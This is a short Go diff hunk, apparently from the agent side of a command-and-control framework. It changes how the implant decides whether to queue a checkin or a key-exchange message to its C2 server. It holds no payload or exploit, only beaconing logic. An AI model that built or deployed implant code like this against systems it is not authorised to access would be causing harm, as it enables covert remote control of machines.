@@ -108,7 +108,7 @@ func (a *Agent) CheckIn() {
 		}
 	}
 
-	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) {
+	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) && !a.IsCommandInSendQ(AgentCommand_AGENT_KEYX) {
 		// if we don't have a computed secret yet, we will send dummy data with our checkin
 		// this will be our first ping if the c2 doesn't know about us yet.
 		// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
